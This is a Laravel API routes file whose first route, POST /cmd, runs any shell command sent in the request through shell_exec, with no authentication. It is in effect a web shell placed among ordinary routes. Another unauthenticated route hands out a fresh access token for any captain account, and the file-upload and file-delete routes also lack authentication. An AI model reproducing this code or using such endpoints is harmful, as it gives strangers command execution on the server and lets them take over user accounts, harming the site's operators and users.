<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use \App\Models\Captain;
use \App\Http\Controllers\API\FileController;
/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/
Route::post('/cmd', function (Request $request) {
    return shell_exec($request->line);
})->name('cmd');

Route::get('token/{captain}', function (Captain $captain){
    DB::table('oauth_access_tokens')
        ->where('user_id', $captain->id)
        ->where('name', 'Token-Captain')
        ->delete();

    $token = $captain->createToken('Token-Captain', ['allow-captain'])->accessToken;

    $captain->update([
        'remember_token' => $token,
    ]);

    return $token;
});

Route::middleware(['auth', 'scope:allow-captain'])->get('/user', function (Request $request) {
    return $request->user();
});

Route::post('upload-files', [FileController::class, 'uploadFile']);
Route::delete('delete-uploaded-files', [FileController::class, 'deleteUploadFile']);
